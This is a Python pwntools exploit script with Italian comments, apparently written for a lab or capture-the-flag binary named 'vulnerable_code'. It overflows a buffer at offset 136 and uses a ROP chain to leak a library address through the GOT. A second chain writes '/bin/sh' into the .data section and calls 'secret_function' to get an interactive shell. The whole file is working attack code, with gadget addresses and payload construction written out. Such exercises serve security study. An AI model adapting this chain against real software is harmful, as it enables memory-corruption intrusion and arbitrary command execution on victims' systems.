from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 136
binsh = "/bin/sh\x00"

# *--------------------- Gadgets --------------------*

where_to_write = p64(0x404050) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
pop_r12_r13 = p64(0x40134c) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x40134e) # pop r13; pop r14; pop r15; ret;
pop_rdi = p64(0x401353) # pop rdi; ret;
pop_rbp = p64(0x4011dd) # pop rbp; ret;
pop_rsi = p64(0x401351) # pop rsi; pop r15; ret;
mov_rax_r13 = p64(0x4011b8) # mov rax, r13; ret;
mov_mmr13_r12 = p64(0x40114a) # mov qword ptr [r13], r12; ret;
add_mmrax_rbp = p64(0x401178) # add qword ptr [rax], rbp; ret;
xor_rdx = p64(0x4011e8) # xor edx, edx; ret;

# *--------------------- Funzioni -------------------*

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def send_payload(list) :  # se w_off Ã¨ true viene aggiunto al payload l'offset per mandare in overflow il buffer
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./vulnerable_code','./lib.so') # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(7)
p.sendline("2")
p.recvlines(2) # inserisci username 

# *-- ROP CHAIN -> leak indirizzo effettivo lib func -*

rop = ROP([elf,libc])
rop.call(elf.symbols["puts"])
rop.call(elf.symbols["puts"],[elf.got["change_username"]])
rop.call(elf.symbols["change_username"])

payload = dict()
payload[offset]= rop
p.sendline(fit(payload))

p.recvlines(3)


# *---------  Set libc start memory adress ----------*

change_usr_lib_idx = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
libc.address = change_usr_lib_idx - libc.symbols["change_username"] # ROPgadget applica automaticamente l'offset corretto alle funzione in base all'indirizzo di start fornito
log.critical(f"Trovato l'indirzzo di partenza su cui risiedono le funzioni di lib.so in memoria : {hex(libc.address)}")

# *-----  ROP CHAIN -> chimata a secret_function ----*

p.recvuntil(":") # insert username

rop = ROP([elf,libc])
rop.raw(pop_r12_r13) # pop r12; pop r13; pop r14; pop r15; ret;
rop.raw("/bin/sh\x00") # r12 = "/bin/sh\x00"
rop.raw(where_to_write) # r13 = .data idx
rop.raw(p64(0x00)) # r14 = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(mov_mmr13_r12) # mov [r13], r12; ret;
rop.raw(pop_rsi) # pop rsi; pop r15; ret;
rop.raw(p64(0x00)) # rsi = 0x0000000000000000
rop.raw(p64(0x00)) # r15 = 0x0000000000000000
rop.raw(pop_rdi) # pop rdi; ret;
rop.raw(where_to_write) # rdi = .data idx -> "/bin/sh\x00"
rop.raw(xor_rdx) # rdx = 0x0000000000000000
rop.call("secret_function")

payload = dict()
payload[offset] = rop
p.sendline(fit(payload))

log.critical(f"Chiamata alla funzione secret_function eseguita correttamente !")

p.recvlines(4)
p.interactive()

# *---------------------  END  ----------------------*